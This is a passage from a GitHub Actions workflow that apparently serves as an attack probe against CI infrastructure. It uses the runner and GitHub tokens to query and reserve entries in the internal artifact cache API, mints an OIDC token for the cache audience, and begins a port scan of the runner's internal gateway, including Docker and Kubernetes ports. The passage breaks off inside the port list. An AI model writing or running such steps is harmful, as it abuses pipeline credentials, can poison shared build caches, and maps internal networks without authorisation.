          echo ""
          echo "--- Probe cache API with correct auth ---"
          for AUTH in "Bearer $RUNTIME_TOKEN" "Bearer $GH_TOKEN"; do
            AUTH_PFX=$(echo "$AUTH" | head -c 20)
            echo ""
            echo "=== Cache API with $AUTH_PFX ==="
            for EP in \
              "/_apis/artifactcache/caches" \
              "/_apis/artifactcache/caches?keys=v8test&version=1" \
              "/_apis/artifactcache/cache" \
              "/_apis/artifactcache/cache?keys=v8test&version=1" ; do
              RC=$(curl -s -o /tmp/cache_body -w "%{http_code}" -m5 \
                -H "Authorization: $AUTH" \
                -H "Content-Type: application/json" \
                "${CACHE_URL}${EP}" 2>/dev/null)
              BODY=$(cat /tmp/cache_body 2>/dev/null | head -c 200)
              echo "G03 GET $EP = HTTP_$RC body='$BODY'"
            done
            echo ""
            echo "--- Try reserve cache ---"
            RC=$(curl -s -o /tmp/cache_body -w "%{http_code}" -m5 -X POST \
              -H "Authorization: $AUTH" \
              -H "Content-Type: application/json" \
              "${CACHE_URL}/_apis/artifactcache/caches" \
              -d '{"key":"v8-test-key","version":"1"}' 2>/dev/null)
            BODY=$(cat /tmp/cache_body 2>/dev/null | head -c 200)
            echo "G04 POST reserve = HTTP_$RC body='$BODY'"
          done
          echo ""
          echo "--- Try with OIDC JWT ---"
          if [ -n "$OIDC_URL" ]; then
            JWT=$(curl -sf -H "Authorization: bearer $OIDC_TOK" \
              "${OIDC_URL}&audience=artifactcache.actions.githubusercontent.com" 2>/dev/null | jq -r '.value // empty' 2>/dev/null)
            if [ -n "$JWT" ]; then
              echo "G05 OIDC JWT for artifactcache: $(echo $JWT | wc -c) chars"
              RC=$(curl -s -o /tmp/cache_body -w "%{http_code}" -m5 \
                -H "Authorization: Bearer $JWT" \
                "${CACHE_URL}/_apis/artifactcache/caches" 2>/dev/null)
              BODY=$(cat /tmp/cache_body 2>/dev/null | head -c 200)
              echo "G05 GET with OIDC = HTTP_$RC body='$BODY'"
            fi
          fi
          true

      - name: 8 Actions Internal Network Deep Scan
        run: |
          set +e
          echo "=== ACTIONS INTERNAL NETWORK DEEP SCAN ==="
          echo "v7: gateway 10.1.0.1, host 10.1.1.106, docker bridge 172.17.0.1/16"
          echo ""
          echo "--- Deeper port scan on gateway ---"
          echo "H01 gateway 10.1.0.1 full port scan:"
          for PORT in 22 53 80 443 445 636 1433 2375 2376 3000 3306 4243 5000 \
            5432 5985 5986 6379 6443 8080 8443 8888 9090 9200 9418 10250 10255 27017; do
